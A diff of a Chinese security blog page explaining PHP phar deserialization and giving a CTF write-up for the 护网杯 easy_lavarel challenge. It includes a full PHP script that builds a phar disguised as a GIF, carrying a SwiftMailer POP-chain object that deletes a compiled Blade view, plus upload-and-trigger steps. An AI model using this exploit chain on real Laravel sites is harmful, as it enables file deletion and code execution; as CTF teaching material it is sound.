@@ -1,154 +1,111 @@
+
 <!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  
-  <title>phar反序列化rce | Altm4nz</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  
-  <meta name="keywords" content="web" />
-  
-  
-  
-  
-  <meta name="description" content="前言在Blackhat2018，来自Secarma的安全研究员Sam Thomas讲述了一种攻击PHP应用的新方式，利用这种方法可以在不使用unserialize()函数的情况下触发PHP反序列化漏洞。">
-<meta name="keywords" content="web">
-<meta property="og:type" content="article">
-<meta property="og:title" content="phar反序列化rce">
-<meta property="og:url" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;10&#x2F;26&#x2F;phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce&#x2F;index.html">
-<meta property="og:site_name" content="Altm4nz">
-<meta property="og:description" content="前言在Blackhat2018，来自Secarma的安全研究员Sam Thomas讲述了一种攻击PHP应用的新方式，利用这种方法可以在不使用unserialize()函数的情况下触发PHP反序列化漏洞。">
-<meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;10&#x2F;26&#x2F;phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce&#x2F;1.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;10&#x2F;26&#x2F;phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce&#x2F;2.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;10&#x2F;26&#x2F;phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce&#x2F;3.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;10&#x2F;26&#x2F;phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce&#x2F;4.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;10&#x2F;26&#x2F;phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce&#x2F;5.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;10&#x2F;26&#x2F;phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce&#x2F;6.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;10&#x2F;26&#x2F;phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce&#x2F;7.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;10&#x2F;26&#x2F;phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce&#x2F;8.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;10&#x2F;26&#x2F;phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce&#x2F;9.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;10&#x2F;26&#x2F;phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce&#x2F;11.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;10&#x2F;26&#x2F;phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce&#x2F;10.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;10&#x2F;26&#x2F;phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce&#x2F;12.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;10&#x2F;26&#x2F;phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce&#x2F;13.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;10&#x2F;26&#x2F;phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce&#x2F;14.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;10&#x2F;26&#x2F;phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce&#x2F;15.png">
-<meta property="og:updated_time" content="2018-11-26T10:03:21.588Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;10&#x2F;26&#x2F;phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce&#x2F;1.png">
-  
-    <link rel="alternate" href="/atom.xml" title="Altm4nz" type="application/atom+xml">
-  
-  <link rel="icon" href="/css/images/pokemon.ico">
-  
-    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-  
-  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
-  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
-  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
-  <style type="text/css">
-    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
-    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
-    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
-    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
+<html lang="zh-Hans">
+    <head>
+        <title>phar反序列化rce</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=2.0">
+<link rel="stylesheet", href="/./css/style.css">
+<link rel="shortcut icon", href="/../../../../favicon.ico">
+<link rel="apple-touch-icon", href="/./apple-touch-icon.png">
+
+        
     
-  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+    <link rel='stylesheet' href="/./css/dracula.css">
 
-  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
-  <link rel="stylesheet" href="/css/style.css">
-
-  <script src="/js/jquery-3.1.1.min.js"></script>
-
-  <!-- Bootstrap core CSS -->
-  <link rel="stylesheet" href="/css/bootstrap.css" >
-  <link rel="stylesheet" href="/css/fashion.css" >
-  <link rel="stylesheet" href="/css/glyphs.css" >
-
-</head>
-
-
-
-  <body data-spy="scroll" data-target="#toc" data-offset="50">
-
-
-  
-
-
-<header id="allheader" class="site-header" role="banner" 
-   >
-  <div class="clearfix container">
-      <div class="site-branding">
-
-          <h1 class="site-title">
-            
-              <a href="/" title="Altm4nz" rel="home"> Altm4nz </a>
-            
-          </h1>
-          
-          
-            
-          <nav id="main-navigation" class="main-navigation" role="navigation">
-            <a class="nav-open">Menu</a>
-            <a class="nav-close">Close</a>
-
-            <div class="clearfix sf-menu">
-              <ul id="main-nav" class="menu sf-js-enabled sf-arrows"  style="touch-action: pan-y;">
-                    
-                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/">Home</a> </li>
-                    
-                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/archives">Archives</a> </li>
-                    
-                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/tags">Tags</a> </li>
-                    
-                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/friend">friend</a> </li>
-                    
-                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/about">About</a> </li>
-                    
-              </ul>
+    </head>
+    <body>
+        <header class="al_header al_pos_fixed">
+    <div class="al_header_container dis_flex_jcenter">
+        <div class="al_header_container_left">
+            <div class="al_header_site_title">
+                <a href="/">Altm4nz's blog</a>
             </div>
-          </nav>
+        </div>
 
-      </div>
-  </div>
+        <div class="dis_flex_jcenter">
+            <div class="al_header_setting">
+                <svg class="al_header_icon">
+                    <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-menu"></use>
+                </svg>
+            </div>
+        </div>
+    </div>
 </header>
 
+        <div class="al_sidebar">
 
-  <div id="container">
-    <div id="wrap">
+    <div class="al_sidebar_overlay al_full_cover"></div>
+
+    <div class="al_pos_fixed al_sidebar_cnt">
+        <div class="dis_flex_acenter al_sidebar_header">
+            <h3>Altm4nz's blog</h3>
+            <div class="al_sidebar_close al_header_setting">
+                <svg class="al_header_icon">
+                    <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-close"></use>
+                </svg>
+            </div>
+        </div>
+
+        <div class="al_sidebar_author_cnt">
+
+            <div class="al_sidebar_author_info">
+                
+                <img class="al_sidebar_avatar" src="../../../../images/IMG_4178.JPG">
+                <p></p>
+                <h4>WEB划水选手</h4>
+            </div>
+
             
-      <div id="content" class="outer">
-        
-          <section id="main" style="float:none;"><article id="post-phar反序列化rce" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" class="article-title" itemprop="name">
-      phar反序列化rce
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	<a href="/2018/10/26/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/" class="article-date">
-	  <time datetime="2018-10-26T02:54:15.000Z" itemprop="datePublished">October 26, 2018</time>
-	</a>
-
-       
-      
-	<span id="busuanzi_container_page_pv">
-	  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
-	</span>
-
+        </div>
     </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在Blackhat2018，来自Secarma的安全研究员Sam Thomas讲述了一种攻击PHP应用的新方式，利用这种方法可以在不使用unserialize()函数的情况下触发PHP反序列化漏洞。</p>
+</div>
+
+        
+    <div class="dis_flex_center al_lightbox_cnt al_full_cover">
+        <img class="al_lightbox_img"/>
+    </div>
+    <div class="al_page_background dis_flex_center al_full_cover"></div>
+    <div class="al_page_container">
+        <div class="al_pos_ab al_fake_background"></div>
+        <div class="al_main_container al_shadow al_main_page_container">
+            <article class="al_article">
+                <header>
+                    <h1 class="al_page_title">
+                        phar反序列化rce
+                    </h1>
+                    <div class="al_page_info dis_flex">
+                        <div class="al_page_content_info">
+                            October 26, 2018 02:10 AM
+                        </div>
+
+                        
+                            <div class="al_page_content_info">
+                                1.3k words
+                            </div>
+                        
+
+                        
+                            <div class="al_page_content_info">
+                                5 minutes read
+                            </div>
+                            <div class="al_page_content_info">
+                                本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+                            </div>
+                        
+                        <span class="tags"></span>
+                    </div>
+                </header>
+
+                
+                    <div class="al_page_content_outline">
+                        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#原理"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#测试"><span class="toc-text">测试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用条件"><span class="toc-text">漏洞利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#测试代码"><span class="toc-text">测试代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#生成phar文件"><span class="toc-text">生成phar文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#触发漏洞"><span class="toc-text">触发漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#护网杯-easy-lavarel"><span class="toc-text">护网杯 easy_lavarel</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#浏览源码"><span class="toc-text">浏览源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql注入"><span class="toc-text">sql注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#重置密码"><span class="toc-text">重置密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Blade"><span class="toc-text">Blade</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POP-CHAIN"><span class="toc-text">POP CHAIN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phar反序列化"><span class="toc-text">phar反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#构造phar文件"><span class="toc-text">构造phar文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#check"><span class="toc-text">check</span></a></li></ol></li></ol></li></ol>
+                    </div>
+                
+
+                
+                <section id="post-body">
+                    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在Blackhat2018，来自Secarma的安全研究员Sam Thomas讲述了一种攻击PHP应用的新方式，利用这种方法可以在不使用unserialize()函数的情况下触发PHP反序列化漏洞。</p>
 <a id="more"></a>
 <h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>在使用phar://协议读取文件时，文件会被解析成phar（ <a href="http://php.net/manual/zh/intro.phar.php" target="_blank" rel="noopener">http://php.net/manual/zh/intro.phar.php</a> ）<br>解析过程中会触发php_var_unserialize()函数，造成反序列化。</p>
 <h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><h2 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h2><p>1.服务器上存在可控文件<br>2.服务器端引用了可以利用的魔术方法<br>3.文件操作函数的参数可控</p>
@@ -175,166 +132,62 @@
 <h3 id="构造phar文件"><a href="#构造phar文件" class="headerlink" title="构造phar文件"></a>构造phar文件</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_AbstractFilterableInputStream</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Write sequence.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $sequence = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * StreamFilters.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Swift_StreamFilter[]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $filters = [];</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A buffer for writing.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $writeBuffer = <span class="string">''</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Bound streams.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Swift_InputByteStream[]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $mirrors = [];</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_FileByteStream</span> <span class="keyword">extends</span> <span class="title">Swift_ByteStream_AbstractFilterableInputStream</span> </span>&#123;</span><br><span class="line">    <span class="comment">/** The internal pointer offset */</span></span><br><span class="line">    <span class="keyword">private</span> $_offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The path to the file */</span></span><br><span class="line">    <span class="keyword">private</span> $_path;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The mode this file is opened in for writing */</span></span><br><span class="line">    <span class="keyword">private</span> $_mode;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** A lazy-loaded resource handle for reading the file */</span></span><br><span class="line">    <span class="keyword">private</span> $_reader;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** A lazy-loaded resource handle for writing the file */</span></span><br><span class="line">    <span class="keyword">private</span> $_writer;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** If magic_quotes_runtime is on, this will be true */</span></span><br><span class="line">    <span class="keyword">private</span> $_quotes = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** If stream is seekable true/false, or null if not known */</span></span><br><span class="line">    <span class="keyword">private</span> $_seekable = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a new FileByteStream for $path.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $path</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bool   $writable if true</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path, $writable = false)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_path = $path;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_mode = $writable ? <span class="string">'w+b'</span> : <span class="string">'rb'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (function_exists(<span class="string">'get_magic_quotes_runtime'</span>) &amp;&amp; @get_magic_quotes_runtime() == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_quotes = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the complete path to the file.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPath</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_path;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_TemporaryFileByteStream</span> <span class="keyword">extends</span> <span class="title">Swift_ByteStream_FileByteStream</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $filePath = <span class="string">"/usr/share/nginx/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php"</span>;</span><br><span class="line">        <span class="keyword">parent</span>::__construct($filePath, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="keyword">$this</span>-&gt;getPath())) &#123;</span><br><span class="line">            @unlink(<span class="keyword">$this</span>-&gt;getPath());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> Swift_ByteStream_TemporaryFileByteStream();</span><br><span class="line">$p = <span class="keyword">new</span> Phar(<span class="string">'./1.phar'</span>, <span class="number">0</span>);</span><br><span class="line">$p-&gt;startBuffering();</span><br><span class="line">$p-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$p-&gt;setMetadata($obj);</span><br><span class="line">$p-&gt;addFromString(<span class="string">'1.txt'</span>,<span class="string">'text'</span>);</span><br><span class="line">$p-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">'./1.phar'</span>, <span class="string">'1.gif'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <h3 id="check"><a href="#check" class="headerlink" title="check"></a>check</h3><p>上传文件后，在check处抓包，控制path值，利用phar://去解析我们上传的文件，造成反序列化。<br><img src="/2018/10/26/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/14.png" alt=""><br>然后再去请求flag<br><img src="/2018/10/26/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/15.png" alt=""></p>
 
-      
+                </section>
+
+                
+                
+                
+
+
+            
+            <nav class="dis_flex al_post_nav">
+                <a class="al_post_nav_item dis_flex_acenter" href="/2018/11/04/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B-WEB/">
+                    
+                        <svg class="al_arrow">
+                            <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-arrow-left"></use>
+                        </svg>
+                        <span class="al_text_ellipsis al_post_nav_desc">第四届上海市大学生网络安全赛-WEB&MISC</span>
+                    
+                </a>
+                <a class="al_post_nav_item dis_flex_acenter" href="/2018/10/10/0ctf-Ezdoor/">
+                    
+                        <span class="al_text_ellipsis al_post_nav_desc">0ctf-Ezdoor</span>
+                        <svg class="al_arrow">
+                            <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-arrow-right"></use>
+                        </svg>
+                    
+                </a>
+            </nav>
+        </div>
     </div>
-    <footer class="entry-meta entry-footer">
-      
-      
-  <span class="ico-tags"></span>
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
 
-      
-    </footer>
-    <hr class="entry-footer-hr">
-  </div>
-  
+
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="al_index_footer dis_flex_center">
+
+
+
     
-<nav id="article-nav">
-  
-    <a href="/2018/11/04/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B-WEB/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          第四届上海市大学生网络安全赛-WEB&amp;MISC
-        
-      </div>
-    </a>
-  
-  
-    <a href="/2018/10/10/0ctf-Ezdoor/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">0ctf-Ezdoor</div>
-    </a>
-  
-</nav>
-
-  
-</article>
-
-<!-- Table of Contents -->
-
-  <aside id="sidebar">
-    <div id="toc" class="toc-article">
-    <strong class="toc-title">Contents</strong>
     
-      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#原理"><span class="nav-number">2.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#测试"><span class="nav-number">3.</span> <span class="nav-text">测试</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用条件"><span class="nav-number">3.1.</span> <span class="nav-text">漏洞利用条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#测试代码"><span class="nav-number">3.2.</span> <span class="nav-text">测试代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#生成phar文件"><span class="nav-number">3.3.</span> <span class="nav-text">生成phar文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#触发漏洞"><span class="nav-number">3.4.</span> <span class="nav-text">触发漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#护网杯-easy-lavarel"><span class="nav-number">3.5.</span> <span class="nav-text">护网杯 easy_lavarel</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#浏览源码"><span class="nav-number">3.5.1.</span> <span class="nav-text">浏览源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql注入"><span class="nav-number">3.5.2.</span> <span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#重置密码"><span class="nav-number">3.5.3.</span> <span class="nav-text">重置密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Blade"><span class="nav-number">3.5.4.</span> <span class="nav-text">Blade</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POP-CHAIN"><span class="nav-number">3.5.5.</span> <span class="nav-text">POP CHAIN</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phar反序列化"><span class="nav-number">3.5.6.</span> <span class="nav-text">phar反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#构造phar文件"><span class="nav-number">3.5.7.</span> <span class="nav-text">构造phar文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#check"><span class="nav-number">3.5.8.</span> <span class="nav-text">check</span></a></li></ol></li></ol></li></ol>
-    
+
+    <div class="al_index_footer_item al_index_footer_extra">
+        Power By 
+        <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>
     </div>
-  </aside>
 
-</section>
-        
-      </div>
-
+    <div class="al_index_footer_item al_index_footer_extra_right">
+        All Right Reserved
     </div>
-    <!-- <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-    <a href="/tags" class="mobile-nav-link">Tags</a>
-  
-    <a href="/friend" class="mobile-nav-link">Friend</a>
-  
-    <a href="/about" class="mobile-nav-link">About</a>
-  
-</nav> -->
-    <footer id="footer" class="site-footer">
-  
-
-  <div class="clearfix container">
-      <div class="site-info">
-	      &copy; 2020 Altm4nz All Rights Reserved.
-        
-            <span id="busuanzi_container_site_uv">  
-              本站总访问量<span id="busuanzi_value_site_pv"></span>次
-            </span>
-          
-      </div>
-      <div class="site-credit">
-        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hipaper" target="_blank">hipaper</a>
-      </div>
-  </div>
-</footer>
-
-
-<!-- min height -->
-
-<script>
-    var wrapdiv = document.getElementById("wrap");
-    var contentdiv = document.getElementById("content");
-
-    wrapdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
-    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
-
-
-    <!-- headerblur min height -->
-    
-    
-</script>
-    
-<div style="display: none;">
-  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+    <div class="al_index_footer_item al_index_footer_extra_right">
+            本站总访问量<span id="busuanzi_value_site_pv"></span>次
+    </div>
+            
 </div>
 
-<!-- mathjax config similar to math.stackexchange -->
-
